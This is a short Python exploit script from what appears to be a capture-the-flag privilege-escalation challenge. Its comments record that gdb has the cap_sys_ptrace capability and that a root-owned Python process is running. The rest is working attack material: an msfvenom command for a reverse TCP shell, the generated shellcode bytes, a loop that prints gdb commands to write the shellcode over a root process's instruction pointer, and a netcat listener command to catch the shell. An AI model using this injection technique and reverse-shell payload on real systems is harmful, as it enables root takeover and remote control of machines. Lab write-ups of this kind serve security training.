#!/usr/bin/env python3

# ================================
#            FINDINGS
# ================================

# ctf-cap-62bab5ec1d1e018f-dfc8989d6-6bcpb:~$ getcap /usr/bin/gdb
# /usr/bin/gdb cap_sys_ptrace=eip

# ctf-cap-62bab5ec1d1e018f-dfc8989d6-xx9hw:~$ ps -ef --forest
# UID          PID    PPID  C STIME TTY          TIME CMD
# root           1       0  0 05:49 ?        00:00:00 /bin/bash ./entrypoint.sh
# root           7       1  0 05:49 ?        00:00:00 /bin/bash ./challenge_manager.sh
# root         167       7  0 06:21 ?        00:00:00  \_ python3 ./very_important_script.py
# root           8       1  0 05:49 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
# root         169       8  0 06:27 ?        00:00:00  \_ sshd: btsbob [priv]
# btsbob       171     169  0 06:27 ?        00:00:00      \_ sshd: btsbob@pts/0
# btsbob       172     171  0 06:27 pts/0    00:00:00          \_ -bash
# btsbob       173     172  0 06:27 pts/0    00:00:00              \_ ps -ef --forest

# ================================
#             EXPLOIT
# ================================
# Follow this: https://www.youtube.com/watch?v=LGO-dn7668g&t=2550
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x7f\x00\x00\x01"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

payload = b'\x90' * (8 - len(buf) % 8) + buf

for i in range(0, len(buf), 8):
    chunk = payload[i:i+8][::-1]
    chunks = "0x"
    for byte in chunk:
        chunks += f'{byte:02x}'
    print(f'set {{long}}($rip+{i}) = {chunks}')

# connect with another ssh session and `nc -lnvp 9001`
# `very_important_script.py` is just infinite `sleep()` just like the ippsec video 
# we use 127.0.0.1 because the box is not allowed to go out to the internet